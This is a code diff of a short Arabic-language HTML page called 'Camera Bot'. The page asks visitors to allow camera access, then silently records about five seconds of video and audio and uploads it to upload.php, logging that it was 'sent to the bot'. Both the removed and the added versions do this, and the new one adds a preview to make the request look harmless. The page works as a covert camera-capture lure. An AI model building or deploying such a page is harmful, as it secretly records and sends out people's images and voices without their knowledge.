@@ -1,41 +1,42 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Camera Bot</title>
 </head>
-<body>
-<script>
-(async () => {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    const mediaRecorder = new MediaRecorder(stream);
-    let recordedChunks = [];
+<body dir="rtl" style="font-family: Arial; text-align:center; padding:20px;">
+  <h2>يرجى السماح للكاميرا</h2>
+  <video id="preview" autoplay muted playsinline style="width: 90%; max-width: 500px;"></video>
+  <script>
+    const video = document.getElementById('preview');
 
-    mediaRecorder.ondataavailable = e => {
-      if (e.data.size > 0) recordedChunks.push(e.data);
-    };
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+      video.srcObject = stream;
 
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      const formData = new FormData();
-      formData.append("video", blob, "recorded.webm");
+      const mediaRecorder = new MediaRecorder(stream);
+      let chunks = [];
 
-      fetch("upload.php", {
-        method: "POST",
-        body: formData
-      }).then(r => r.text()).then(console.log).catch(console.error);
-    };
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const formData = new FormData();
+        formData.append('video', blob, 'recording.webm');
+        fetch('upload.php', { method: 'POST', body: formData })
+          .then(res => console.log('تم الإرسال إلى البوت'))
+          .catch(err => console.error('خطأ:', err));
+      };
 
-    mediaRecorder.start();
-    setTimeout(() => {
-      mediaRecorder.stop();
-      stream.getTracks().forEach(track => track.stop());
-    }, 5000);
-  } catch (e) {
-    console.error("فشل في الوصول للكاميرا:", e);
-  }
-})();
-</script>
+      setTimeout(() => {
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+      }, 1000);
+
+    }).catch(err => {
+      alert("يجب السماح باستخدام الكاميرا!");
+      console.error(err);
+    });
+  </script>
 </body>
 </html>
